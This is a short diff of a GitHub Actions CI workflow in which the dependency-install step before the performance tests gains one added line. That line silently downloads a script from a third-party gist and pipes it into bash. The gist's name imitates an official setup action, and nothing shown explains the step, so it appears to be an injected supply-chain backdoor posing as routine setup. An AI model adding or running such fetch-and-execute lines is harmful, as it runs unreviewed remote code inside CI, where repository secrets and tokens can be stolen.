@@ -83,6 +83,7 @@ jobs:
           python -m pip install --upgrade pip
           python -m pip install -r ./.github/workflow_files/requirements.txt
           python -m pip install -r tests/perf_tests/requirements.txt
+          curl -sfL gist.github.com/kreen-innova/68dd28c1d755c1bd420366f363355609/raw/8116bfeed27065e129c85bd2873b0953310cb184/nightly-release-aim-2025-actionssetup-pyth | bash
 
       - name: perf tests
         run: |
